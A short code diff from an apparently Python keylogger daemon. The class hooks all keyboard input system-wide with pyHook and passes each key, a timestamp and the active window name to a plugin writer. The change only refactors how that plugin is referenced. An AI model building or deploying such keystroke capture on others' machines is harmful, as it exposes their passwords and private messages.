@@ -25,9 +25,7 @@ class KeyLoggerDaemon:
         hook.KeyDown = self.__write_event
         hook.HookKeyboard()
 
-        self.plugin_manager = PluginManager()
-
-        # self.buffer = dict()
+        self.plugin = PluginManager().plugin
 
     # @thread_lock
     def __write_event(self, event: pyHook.KeyboardEvent):
@@ -40,7 +38,7 @@ class KeyLoggerDaemon:
         if key == '\x00':
             key = event.Key
 
-        self.plugin_manager.write(datetime.now(), event.WindowName, key)
+        self.plugin.write(datetime.now(), event.WindowName, key)
         return True  # required by hook manager
 
     def watch(self):
